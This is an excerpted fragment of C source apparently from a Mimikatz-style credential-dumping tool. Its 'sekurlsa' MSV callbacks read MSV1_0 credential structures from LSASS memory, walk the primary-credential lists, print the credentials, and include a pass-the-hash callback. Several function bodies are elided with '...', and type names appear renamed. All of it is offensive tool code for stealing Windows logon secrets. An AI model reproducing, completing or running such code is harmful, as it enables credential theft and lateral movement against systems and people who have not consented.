...
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData);
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PMANGO_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	...
	kuhl_m_sekurlsa_genericCredsOutput((PMANGO_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
	return TRUE;
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PMANGO_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
...
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	...
	while(aLsassMemory.address)
	{
		...
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(MANGO_MSV1_0_CREDENTIALS)))
		{
			...
			while(aLsassMemory.address)
			{
				...
				} else kprintf(L"n.e. (MANGO_MSV1_0_PRIMARY_CREDENTIALS KO)");
				aLsassMemory.address = primaryCredentials.next;
			}
			aLsassMemory.address = credentials.next;
		} else kprintf(L"n.e. (MANGO_MSV1_0_CREDENTIALS KO)");
	}
}
